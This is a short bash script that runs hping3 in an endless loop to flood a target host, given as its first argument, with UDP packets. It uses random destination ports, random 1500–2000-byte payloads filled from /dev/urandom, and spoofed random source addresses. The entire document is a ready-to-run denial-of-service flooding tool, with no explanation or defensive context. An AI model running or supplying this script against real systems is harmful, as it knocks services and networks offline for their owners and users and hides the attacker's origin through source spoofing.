#!/bin/bash

while true;
do
    PACKSIZE=`shuf -i 1500-2000 -n 1`;
    RNDPORT=`echo $RANDOM % 65535 | bc`;
    hping3 --udp --flood -p $RNDPORT -c 2000 -d $PACKSIZE --file /dev/urandom --rand-source $1;
done

